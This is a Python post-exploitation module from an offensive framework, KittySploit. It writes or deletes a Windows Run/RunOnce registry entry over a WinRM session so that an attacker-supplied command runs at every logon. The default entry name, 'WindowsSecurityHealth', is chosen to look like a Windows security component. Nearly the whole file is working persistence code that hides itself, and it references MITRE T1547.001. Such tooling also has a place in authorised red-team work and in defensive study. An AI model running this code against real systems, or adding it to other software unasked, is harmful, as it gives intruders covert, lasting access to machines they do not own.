#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.winrm.winrm_session_mixin import WinRMSessionMixin


class Module(Post, WinRMSessionMixin):
	__info__ = {
		"name": "WinRM Persistence Run Key",
		"description": "Add or remove a Run/RunOnce registry persistence entry via WinRM",
		"author": "KittySploit Team",
		"platform": Platform.WINDOWS,
		"session_type": SessionType.WINRM,
		"references": ["https://attack.mitre.org/techniques/T1547.001/"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation", "persistence"],
			"expected_requests": 2,
			"reversible": True,
			"approval_required": True,
			"produces": ["risk_signals"],
			"chain": {
				"consumes_capabilities": ["authenticated_session"],
				"produces_capabilities": ["persistence"],
				"suggested_followups": [],
			},
		},
	}

	value_name = OptString("WindowsSecurityHealth", "Registry value name", True)
	command = OptString("", "Command to store in the Run key", True)
	hive = OptChoice("hkcu", "Registry hive", True, choices=["hkcu", "hklm"])
	run_once = OptBool(False, "Use RunOnce instead of Run", False)
	remove = OptBool(False, "Remove the value instead of creating it", False)

	def run(self):
		try:
			name = str(self.value_name or "").strip()
			if not name:
				raise ProcedureError(FailureType.ConfigurationError, "value_name is required")

			hive = "HKCU" if str(self.hive or "hkcu").lower() == "hkcu" else "HKLM"
			key = "RunOnce" if bool(self.run_once) else "Run"
			reg_path = f"{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\{key}"

			if bool(self.remove):
				print_status(f"Removing {reg_path}\\{name}...")
				out = self.cmd_execute(f'reg delete "{reg_path}" /v "{name}" /f') or ""
				print_info(out.strip() or "(no output)")
				print_success("Run key value removal requested")
				return True

			cmd = str(self.command or "").strip()
			if not cmd:
				raise ProcedureError(FailureType.ConfigurationError, "command is required")

			print_status(f"Writing {reg_path}\\{name}...")
			out = self.cmd_execute(f'reg add "{reg_path}" /v "{name}" /t REG_SZ /d "{cmd}" /f') or ""
			print_info(out.strip() or "(no output)")
			print_success("Run key persistence installed")
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"WinRM run key error: {exc}")
